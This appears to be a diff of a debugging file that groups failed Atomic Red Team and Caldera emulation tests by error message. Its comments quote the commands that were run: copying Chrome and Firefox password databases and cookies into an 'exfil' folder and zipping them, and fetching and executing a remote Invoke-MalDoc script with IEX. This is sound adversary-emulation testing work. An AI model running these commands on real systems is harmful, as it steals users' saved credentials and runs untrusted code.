+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__560688901ad2b8f465e98c52379ae834", # chrome
+																																										# ['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\' because it does not exist.At line:1 char:1+ Copy-Item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Da ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ault\\Login Data:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand Remove-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\' because it does not exist.At line:1 char:138+ ... s" > $null; Remove-Item "$env:localappdata\\Google\\Chrome\\User Data\\De ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ault\\Login Data:String) [Remove-Item], ItemNotFoundEx    ception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand Copy-Item : Cannot find path \'C:\\T1555.003\\src\\Login Data\' because it does not exist.At line:1 char:222+ ... a" > $null; Copy-Item "$env:PathToAtomicsFolder\\T1555.003\\src\\Login D ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1555.003\\src\\Login Data:String) [Copy-Item], ItemNotFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand cd : Cannot find path \'C:\\T1555.003\\bin\' because it does not exist.At line:1 char:359+ ... efault\\" > $null; cd "$env:PathToAtomicsFolder\\T1555.003\\bin"; .\\Brow ...+                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1555.003\\bin:String) [Set-Location], ItemNotFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\BrowserCollector.exe : The term \'.\\BrowserCollector.exe\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:404+ ... ; cd "$env:PathToAtomicsFolder\\T1555.003\\bin"; .\\BrowserCollector.exe+                                                    ~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\BrowserCollector.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+																																										# ['Copy-Item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data" -Destination "PathToAtomicsFolder\\..\\ExternalPayloads" > $null; Remove-Item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data" > $null; Copy-Item "$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data" -Destination "$env:localappdata\\Google\\Chrome\\User Data\\Default\\" > $null; cd "$env:PathToAtomicsFolder\\T1555.003\\bin"; .\\BrowserCollector.exe']
+
+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__5610bf38f44ad2da2ecb846ba776ecdc", # firefox
+																																										# ['get-childitem : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\' because it does not exist.At line:1 char:23+ ... BLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profile ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...irefox\\Profiles:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand The system cannot find the path specified.']
+																																										# ['$PasswordDBLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\Firepwd.py -d $PasswordDBLocation > $env:temp\\T1555.003Test8.txt; cat $env:temp\\T1555.003Test8.txt']
+
+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__679ef375ad2b361965500392419d084c", # firefox ( Maybe could fix )
+																																										# ['Copy-Item : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\\' because it does not exist.At line:1 char:1+ Copy-Item "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\" -Destination "Path ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...refox\\Profiles\\:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+																																										# ['Copy-Item "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\" -Destination "PathToAtomicsFolder\\..\\ExternalPayloads" -Force -Recurse']
+	
+
+	"atomic_windows_depfalse_pshtrue__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__56c2f2d8b48bcb1c999d4e8929bd8d9b", # firefox
+																																										# ['get-childitem : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\' because it does not exist.At line:1 char:180+ ... sLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profile ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...irefox\\Profiles:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']
+																																										# ['$exfil_folder = "$env:temp\\T1555.003"; if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}; $FirefoxCredsLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\"; if (test-path "$FirefoxCredsLocation\\key4.db") {copy-item "$FirefoxCredsLocation\\key4.db" -destination "$exfil_folder\\T1555.003Firefox_key4.db"} else {}; if (test-path "$FirefoxCredsLocation\\logins.json") {copy-item "$FirefoxCredsLocation\\logins.json" -destination "$exfil_folder\\T1555.003Firefox_logins.json"} else {}; if (test-path "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data") {copy-item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data" -destination "$exfil_folder\\T1555.003Chrome_Login Data"} else {}; if (test-path "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account") {copy-item "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account" -destination "$exfil_folder\\T1555.003Chrome_Login Data For Account"} else {}; if (test-path "$env:appdata\\Opera Software\\Opera Stable\\Login Data") {copy-item "$env:appdata\\Opera Software\\Opera Stable\\Login Data" -destination "$exfil_folder\\T1555.003Opera_Login Data"} else {}; if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\\T1555.003Edge_Login Data"} else {} ; compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force']
+
+	"atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__d54bcaf2e58f6d95da2a54dcb5853a57", # firefox
+																															 # ['get-childitem : Cannot find path \'C:\\Users\\puma-4\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\' because it does not exist.At line:1 char:88+ ... BLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profile ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...irefox\\Profiles:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand out-file : Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1539FirefoxCookies.txt\'.At line:1 char:373+ ... Location" | out-file -filepath "PathToAtomicsFolder\\..\\ExternalPayloa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand ']
+																															 # ['stop-process -name "firefox" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path "$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite"; "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe "$CookieDBLocation" | out-file -filepath "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539FirefoxCookies.txt"']
+
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b", # vncviewer (Maybe could fix)
+																															 # ["Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand "]
+																															 # ["Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'"]
+
+	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__1ce0e92b4cd09129c6d0f3aafb38c600", # Connect.exe (Maybe could fix)
+																															 # ['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process $env:ProgramFiles\\Connect\\Connect.exe+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']
+																															 # ['Start-Process $env:ProgramFiles\\Connect\\Connect.exe']
 
 ],
 
-"Timeout reached, but couldn't kill the process": [	
-	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__e99cce5c-cb7e-4a6e-8a09-1609a221b90a",
-	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__e3db134c-4aed-4c5a-9607-c50183c9ef9e",
-	"stockpile_windows_depfalse_pshtrue__t1548_002__privilege-escalation__abuse_elevation_control_mechanism-_bypass_user_access_control__b7344901-0b02-4ead-baf6-e3f629ed545f",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__f50ec080343f1bec4e739dd20675c349", # team-viewer related
-	"atomic_windows_depfalse_pshtrue__t1218_011__defense-evasion__signed_binary_proxy_execution-_rundll32__16e96b0f0c0021663b2f5dfafabee6f0",
-	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__03a80d4a4c02d99295b5901ee695cc79",
-	"atomic_windows_depfalse_pshtrue__t1106__execution__native_api__2ca71106ee0aff2eda551bb6ed2b39e4",
-	"atomic_windows_depfalse_pshtrue__t1105__command-and-control__ingress_tool_transfer__04d33ddae0126966ae6d841267c17329",
-	"atomic_windows_depfalse_pshtrue__t1090_003__command-and-control__proxy-_multi-hop_proxy__2f4c11504a21b8771b725a3e469fd74b",
-	"atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b", # ['rundll32.exe keymgr,KRShowKeyMgr']
-],
-
-"Timeout reached, process killed": [
-	"atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__b8e136dad1af7b29939e86be6d7ecefa",
-	"atomic_windows_depfalse_pshtrue__t1082__discovery__system_information_discovery__413fc5fa7ac34f8a42183217d7f3ec90",
-	"atomic_windows_depfalse_pshtrue__t1056_002__multiple__input_capture-_gui_input_capture__6f5096d87a8f9ac4c397215cb58cc978",
-	"atomic_windows_depfalse_pshtrue__t1046__discovery__network_service_discovery__65e9fb2b4c023de2a2a73de5cc58ce7f",
-],
-
-
-# TODO -- 세분화
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+# TODO -- 세분화 + 'STDERR or STDOUT' AND 'COMMAND' COPY-PASTE
 # seems like usually because the corresponding Powershell-module is not available
 # those that which are not related to 'PathToAtomicsFolder''
 "is not recognized as the name of a cmdlet, function, script file, or operable program": [
@@ -193,83 +317,74 @@
 
 ],
 
-"System error 1355 has occurred.The specified domain either does not exist or could not be contacted." : [
-	"stockpile_windows_depfalse_pshtrue__t1201__discovery__password_policy_discovery_for_a_domain__2946edba-54d8-11eb-ae93-0242ac130002",
-	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__279d24eeb12b40e4547945accf59ca62",
-	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__4712f45e41760276d20885bbc885a2ef", # related to Active Directory
-],
 
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+# 
+#   TODO:
+# -- Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered
 
-# might be hard to deal with this? because issue is with the remote-server?
-"The remote server returned an error": [
-	"stockpile_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__bfff9006-d1fb-46ce-b173-92cb04e9a031",
-	"atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__9332aff267b00ede37b09606340ee1dc",
-	"atomic_windows_depfalse_pshtrue__t1176__persistence__browser_extensions__70f8b4c0be2ee69f07592eee0aa5acc0",
+#    ** Installing "Office 64 bit" might solve the issue **
+#    		According to https://stackoverflow.com/questions/25167366/error-retrieving-the-com-class-factory-for-component-with-clsid-when-starting
 
-],
+"Retrieving the COM class factory for component with CLSID": [
+	"atomic_windows_depfalse_pshtrue__t1566_001__initial-access__phishing-_spearphishing_attachment__0a69420bec84b02bd47464f6835653b1", # ['New-Object : Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG)).At line:70 char:12+     $app = New-Object -ComObject "$officeProduct.Application"+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (:) [New-Object], COMException    + FullyQualifiedErrorId : NoCOMClassIdentified,Microsoft.PowerShell.Commands.NewObjectCommand New-Item : The registry key at the specified path does not exist.At line:73 char:34+     if (-not (Test-Path $key)) { New-Item $Key }+                                  ~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (HKEY_CURRENT_US...oft\\Office\\Word:String) [New-Item], ArgumentExceptio    n    + FullyQualifiedErrorId : System.ArgumentException,Microsoft.PowerShell.Commands.NewItemCommand Set-ItemProperty : Cannot find path \'HKCU:\\Software\\Microsoft\\Office\\Word\\Security\\\' because it does not exist.At line:74 char:5+     Set-ItemProperty -Path $Key -Name \'AccessVBOM\' -Value 1+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...\\Word\\Security\\:String) [Set-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetItemPropertyCommand You cannot call a method on a null-valued expression.At line:84 char:9+         $doc = $app.Documents.Add()+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull You cannot call a method on a null-valued expression.At line:89 char:5+     $comp = $doc.VBProject.VBComponents.Add(1)+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull You cannot call a method on a null-valued expression.At line:90 char:5+     $comp.CodeModule.AddFromString($macroCode)+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull You cannot call a method on a null-valued expression.At line:91 char:5+     $app.Run($sub)+     ~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull You cannot call a method on a null-valued expression.At line:92 char:5+     $doc.Close(0)+     ~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull You cannot call a method on a null-valued expression.At line:93 char:5+     $app.Quit()+     ~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException    + FullyQualifiedErrorId : InvokeMethodOnNull Exception calling "ReleaseComObject" with "1" argument(s): "Object reference not set to an instance of an object."At line:94 char:5+     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($comp) ...+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : NullReferenceException Exception calling "ReleaseComObject" with "1" argument(s): "Object reference not set to an instance of an object."At line:95 char:5+     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($doc)  ...+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : NullReferenceException Exception calling "ReleaseComObject" with "1" argument(s): "Object reference not set to an instance of an object."At line:96 char:5+     [System.Runtime.InteropServices.Marshal]::ReleaseComObject($app)  ...+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : NullReferenceException ']
+																																		# ['[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing); $macrocode = "   Open `"C:\\Users\\Public\\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"; Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"']
 
-"Could not connect to the domain": [
-	"atomic_windows_depfalse_pshtrue__t1110_003__credential-access__brute_force-_password_spraying__c285cfeaf0c226d3d2b3812726dbe3a8",
-],
-
-"Unexpected token": [
-	"atomic_windows_depfalse_pshtrue__t1615__discovery__group_policy_discovery__38714562d32f33dc32bd7aef553771d9",
-	"atomic_windows_depfalse_pshtrue__t1564_006__defense-evasion__run_virtual_instance__5b0527d3382ac91860501cccc9595348",
-	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__8b5f748da9647a4d9c5a37f20124ba9c",
-	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__c5951c819c5f6125e0e5987a12a344f9",
-
-],
-
-"Cannot enumerate domain":[
-	"atomic_windows_depfalse_pshtrue__t1615__discovery__group_policy_discovery__834e861bba95b87d066e84c5c6b056a0"
-],
-
-
-"You must provide a value expression":[
-	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__69b202bf0bb7b4ff43d4abb8867c1784"
-],
-
-
-"The option <X> is unknown":[
-	"atomic_windows_depfalse_pshtrue__t1570__lateral-movement__lateral_tool_transfer__5458332f329c896a133982a7df20d358"
-],
-
-"A parameter cannot be found that matches parameter name":[
-	"atomic_windows_depfalse_pshtrue__t1570__lateral-movement__lateral_tool_transfer__4de0ba1566249a72e81e74707cc91a00"
-],
-
-"The hash literal was incomplete": [
-	"atomic_windows_depfalse_pshtrue__t1567_003__exfiltration__exfiltration_over_web_service-_exfiltration_to_text_storage_sites__c275ffb52331397b42ebc52338be3c8c",
-	"atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__938a659c52ed102a8b35c7b1bb49eb11",
-	"atomic_windows_depfalse_pshtrue__t1546_003__multiple__event_triggered_execution-_windows_management_instrumentation_event_subscription__4df4fdb269f34dd6d55969c83ff06c73",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c087fa2d3870144b9fd442f476e7768a",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__c0bc49e3838d26569b243ae283082926",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__b26ce33f4cd29428f619fc600e052350",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__79cb459770a15ea9e56b874d62bf8319",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__61e9071d7b1f01969893d015526e1099",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__48dc8d6cce12ca22b19fdbc93bd3a9ed",
-	"atomic_windows_depfalse_pshtrue__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__9eb61c26282c5b324e1fb6cceeefc445",
-	"atomic_windows_depfalse_pshtrue__t1033__discovery__system_owner,user_discovery__725f6e03f3e2098c4303861566f18894",
-
+	"atomic_windows_depfalse_pshtrue__t1555__credential-access__credentials_from_password_stores__935e8026584b85192519c57d7080b048",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__cde814c61dcd8b0fbeeb14f005c2432f",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__ab1b50880382b06d48d3d23ad1786239",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__623806a6fd4d832b6692eb275535f636",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__431121fe12b6fd82938a9a52526b3423",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__705c4b9714ce06223e7d7038cd332808",
+	"atomic_windows_depfalse_pshtrue__t1204_002__execution__user_execution-_malicious_file__98adc43648b0e4ea6e90a88ad5ae4b3d",
+	"atomic_windows_depfalse_pshtrue__t1115__collection__clipboard_data__abd5327a47c4994e2824f833eefe4250",
+	"atomic_windows_depfalse_pshtrue__t1070_001__defense-evasion__indicator_removal_on_host-_clear_windows_event_logs__05f8b752dbccff102ef530103bd8e550",
+	"atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__42302f7d89c15f8070f83e743771d567",
+	"atomic_windows_depfalse_pshtrue__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__9c955a373154a7090d4b4396b561f5da",
+	"atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__9999b5c073203122cbe5f1f5438cf637",
+	"atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__557321faaf98c77b2b452cecd7b1de37",
+	"atomic_windows_depfalse_pshtrue__t1053_005__multiple__scheduled_task,job-_scheduled_task__920a251237fac2b70fe4d647aa16bfdd",
 
 ],
+# ===============================================================================================================================================================
+# [ Prioritize in fixing ]
+# 
+#  Corresponding "Catch" 있는데?
 
-"Could not open the alternate data stream": [
-	"atomic_windows_depfalse_pshtrue__t1564_004__defense-evasion__hide_artifacts-_ntfs_file_attributes__1532b3faf25ad1e6f4fba4ada643b253"
+"The Try statement is missing its Catch or Finally block": [
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__8862278ba483c0d5f719ffbc9186a901", # ['At line:1 char:1128+ ...  -OldPassword $cred.password -NewPassword $newPassword;     };     ca ...+                                                                  ~The Try statement is missing its Catch or Finally block.    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException    + FullyQualifiedErrorId : MissingCatchOrFinally ']
+																												   # ['if (Test-Path $env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else {New-Item -Type Directory (split-path "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") -ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  $env:USERNAME -message "Enter password for $env:USERNAME to use during password change attempt"; $cred.Password | ConvertFrom-SecureString | Out-File "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  $credFile = "$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if (Test-Path $credFile) {;     $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);     if($cred.GetNetworkCredential().Password -eq "Uplow-1"){;       Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;     };     try {;         $newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText -Force;         Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;     };     catch { ;         $_.Exception;         $errCode = $_.Exception.ErrorCode;         Write-Host "Error code: $errCode";         if ($errCode -eq 86) {;             Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";             Remove-Item $credFile;         };         exit $errCode;     };     Write-Host -ForegroundColor Cyan "Successfully changed the password to Uplow-1";     $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "Uplow-1" -AsPlainText -Force));     $newCred.Password | ConvertFrom-SecureString | Out-File $credFile; }; else {;     Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first"; }']
+
+
+
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__53187e13ccee0b0d71451ca3fdc1f9d9",
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__0690e0818b5749092595a472831f362f",
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__015d186adee85e65d7255b383e1a039f",
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__8aabc61664e947c69058c3df4f3af860",
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__3aae7c6d210ffb084186f1686a1f00c1",
+	"atomic_windows_depfalse_pshtrue__t1098__persistence__account_manipulation__1c1381522818218092a12b973593f3a9",
+	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__10a0f4f8efdae71f3e88b3e20560798a", # related to Active Directory
+	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__bba7fe7940f8719efa3c38e54ec79e2c",
+	"atomic_windows_depfalse_pshtrue__t1059_001__execution__command_and_scripting_interpreter-_powershell__0f3401d54f59bc1c3eca134ad5d8a774",
+	"atomic_windows_depfalse_pshtrue__t1036_003__defense-evasion__masquerading-_rename_system_utilities__d9c1b1283c1ad6fdda27be021c4737d3",
+	"atomic_windows_depfalse_pshtrue__t1018__discovery__remote_system_discovery__587a8743222626915bb08b3e9e132b19",
+
+	"atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5", # related to atomics
 ],
-
-"Cannot find any service with service name": [
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f5b48f9f8e01db3edd487c05580a0e90",
-],
-
-"Feature name <X> is unknown": [
-	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__afae914d4839d5194835d8475604e7b8",
-],
+# ===============================================================================================================================================================
 
 
-# TODO -- 세분화
+
+# [ Based on some search of the STDERR on internet, I currently think these might be too complex to fix and time-consuming + many are related to Active Directory ]
+# --- According to "https://stackoverflow.com/questions/45139301/exception-calling-findall-with-0-arguments-trusted-domains-ldap-search"
+#     ** It seems manual work is needed , which is not easy to undersatnd
+#     When running PSRule on a Windows self-hosted agent/ private runner you may encounter an error similar to the following:
+
+# TODO --  세분화 + 'STDERR or STDOUT' AND 'COMMAND' COPY-PASTE
 "Exception calling <X> with <Y> argument(s)" : [
-	"atomic_windows_depfalse_pshtrue__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__e0c75b4cc32124ef4c61508694fd0808",
